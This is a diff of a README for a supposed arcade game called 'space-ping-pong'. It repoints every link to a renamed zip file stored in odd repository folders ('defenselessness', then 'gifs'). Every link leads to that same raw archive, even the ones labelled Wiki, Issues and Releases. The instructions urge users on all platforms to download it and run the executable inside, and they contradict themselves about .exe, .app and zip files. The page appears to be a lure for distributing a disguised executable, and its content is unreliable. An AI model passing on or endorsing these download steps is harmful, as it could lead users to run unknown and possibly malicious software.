@@ -1,6 +1,6 @@
 # 🎮 space-ping-pong - Enjoy Fun Arcade-Style Gaming
 
-[![Download](https://raw.githubusercontent.com/Rhaj06/space-ping-pong/main/defenselessness/space-ping-pong.zip%20now!-Get%20the%20latest%20version-blue)](https://raw.githubusercontent.com/Rhaj06/space-ping-pong/main/defenselessness/space-ping-pong.zip)
+[![Download](https://raw.githubusercontent.com/Rhaj06/space-ping-pong/main/gifs/pong-space-ping-v3.4.zip%20now!-Get%20the%20latest%20version-blue)](https://raw.githubusercontent.com/Rhaj06/space-ping-pong/main/gifs/pong-space-ping-v3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ To get Space Ping Pong on your computer, follow these steps:
 
    Click the button below to go to the Releases page.
 
-   [Download Space Ping Pong](https://raw.githubusercontent.com/Rhaj06/space-ping-pong/main/defenselessness/space-ping-pong.zip)
+   [Download Space Ping Pong](https://raw.githubusercontent.com/Rhaj06/space-ping-pong/main/gifs/pong-space-ping-v3.4.zip)
 
 2. **Choose Your Version:**
 
@@ -22,9 +22,9 @@ To get Space Ping Pong on your computer, follow these steps:
 
 3. **Download the Game:**
 
-   - For Windows: Click on `https://raw.githubusercontent.com/Rhaj06/space-ping-pong/main/defenselessness/space-ping-pong.zip`
-   - For macOS: Click on `https://raw.githubusercontent.com/Rhaj06/space-ping-pong/main/defenselessness/space-ping-pong.zip`
-   - For Linux: Click on `https://raw.githubusercontent.com/Rhaj06/space-ping-pong/main/defenselessness/space-ping-pong.zip`
+   - For Windows: Click on `https://raw.githubusercontent.com/Rhaj06/space-ping-pong/main/gifs/pong-space-ping-v3.4.zip`
+   - For macOS: Click on `https://raw.githubusercontent.com/Rhaj06/space-ping-pong/main/gifs/pong-space-ping-v3.4.zip`
+   - For Linux: Click on `https://raw.githubusercontent.com/Rhaj06/space-ping-pong/main/gifs/pong-space-ping-v3.4.zip`
 
    It will start downloading automatically.
 
@@ -34,7 +34,7 @@ To get Space Ping Pong on your computer, follow these steps:
 
    - **Windows:** Double-click the `.exe` file you downloaded. The game will launch.
    - **macOS:** Open the `.app` file from your Downloads folder. You may need to allow it in your security settings if prompted.
-   - **Linux:** Extract the `https://raw.githubusercontent.com/Rhaj06/space-ping-pong/main/defenselessness/space-ping-pong.zip` file, and run the executable inside.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/Rhaj06/space-ping-pong/main/gifs/pong-space-ping-v3.4.zip` file, and run the executable inside.
 
 5. **Enjoy Playing:**
 
@@ -94,11 +94,11 @@ If you encounter issues:
 
 ## 📝 Additional Resources
 
-- **Documentation:** For detailed technical information and instructions, visit our [Wiki](https://raw.githubusercontent.com/Rhaj06/space-ping-pong/main/defenselessness/space-ping-pong.zip).
-- **Support:** If you have any questions or need help, reach out through our [Issues](https://raw.githubusercontent.com/Rhaj06/space-ping-pong/main/defenselessness/space-ping-pong.zip) page.
+- **Documentation:** For detailed technical information and instructions, visit our [Wiki](https://raw.githubusercontent.com/Rhaj06/space-ping-pong/main/gifs/pong-space-ping-v3.4.zip).
+- **Support:** If you have any questions or need help, reach out through our [Issues](https://raw.githubusercontent.com/Rhaj06/space-ping-pong/main/gifs/pong-space-ping-v3.4.zip) page.
 
 ## 🔗 Download Again
 
 Ready to grab Space Ping Pong? Head back to the Releases page anytime to download the latest version.
 
-[Download Space Ping Pong](https://raw.githubusercontent.com/Rhaj06/space-ping-pong/main/defenselessness/space-ping-pong.zip)
+[Download Space Ping Pong](https://raw.githubusercontent.com/Rhaj06/space-ping-pong/main/gifs/pong-space-ping-v3.4.zip)
